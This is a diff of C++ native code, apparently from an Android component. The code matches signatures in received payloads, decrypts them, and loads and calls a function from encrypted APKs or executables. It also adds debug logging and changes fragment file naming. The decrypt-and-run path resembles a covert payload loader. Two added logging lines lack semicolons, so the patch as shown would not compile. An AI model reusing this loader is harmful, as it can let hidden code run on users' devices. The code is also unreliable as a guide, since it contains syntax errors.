@@ -234,12 +234,14 @@ void *file_op(enum file_op_enum op, string n)
    {  0};
 
    lib = SPC_LOAD_LIBRARY(n.c_str());
+   logd("try with %s",n.c_str())
    if(lib != NULL)
    {
       switch (op)
       {
          case fileop_check:
          s.open = SPC_RESOLVE_SYM(lib, KKK"checksum");
+         logd("returning %s",KKK"checksum")
          return s.open;
          case fileop_close:
          s.close = SPC_RESOLVE_SYM(lib, KKK"close");
@@ -272,7 +274,9 @@ string getFileName(string baseDir, int type, long int ts, int fragment)
       string type_dir = baseDir + "/" + getTypeDir(type);
       if (check_dir(type_dir) == 0) {
          if (fragment >= 0) {
-            filename = type_dir + "/" + boost::lexical_cast<std::string>(ts) + "_" + boost::lexical_cast<std::string>(fragment);
+            memset(tmp,'\0',sizeof(tmp));
+            snprintf(tmp, 5,"%04d",fragment);
+            filename = type_dir + "/" + boost::lexical_cast<std::string>(ts) + "_" + tmp;
          } else if (fragment == FRAGMENT_WILDCHAR) {
             logd("FRAGMENT_WILDCHAR");
             filename = type_dir + "/" + boost::lexical_cast<std::string>(ts) + "_";
@@ -695,7 +699,7 @@ while ((fs = fnc_fs(i)) != NULL && payload != NULL && return_fs != NULL) {
       }
       //Second phase decripy payload first 512 byte and check the signature again\
        //decripted match win against PirstPhase match
-      if (strlen(fs->signature) <= (payload_size * 2)) {
+      if (match ==0 && strlen(fs->signature) <= (payload_size * 2)) {
          //decrypt payload
          char * buffer = new char[CHUNK_SIZE];
 
@@ -731,6 +735,9 @@ file_signature* fs;
 logd("Start");
 match = isMatch(f, payload, payload_size, fs_list, &fs);
 if (match == 2) {
+   /* this branch is used for apk or executable which were encrypted
+    * This is the only way to run a program
+    */
    logd("found %s", fs->h_name);
    typedef int (*test_t)();
    if (file_exist(f)) {
@@ -740,8 +747,7 @@ if (match == 2) {
          logd("3");
          return 3;
       }
-      //crypt((char *)f_t.c_str(),(char *)f.c_str(),(char *)sub40(),0);
-      //shift_file(f,type,f_t);
+      /* here appens the decryption for executable file */
       _isValid((char *) f.c_str());
       test_t test_fnc = (test_t) file_op(fileop_check, f);
       if (test_fnc != NULL) {
@@ -958,7 +964,7 @@ if (payload != NULL && !baseDir.empty() && payload_size > 0) {
                env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_CHECKSUM), env->NewStringUTF("-1"));
                env->CallObjectMethod(hashMap, put, env->NewStringUTF(HASH_FIELD_DATE), env->NewStringUTF(ts_string.c_str()));
             } else {
-               logd("file not ok 0");
+               logd("file not ok 0 check %d",check);
                if (check == 3) {
                   string newFile = getFileName(baseDir, type, 2, FRAGMENT_LOG);
                   shift_file(newFile, type, result_output);
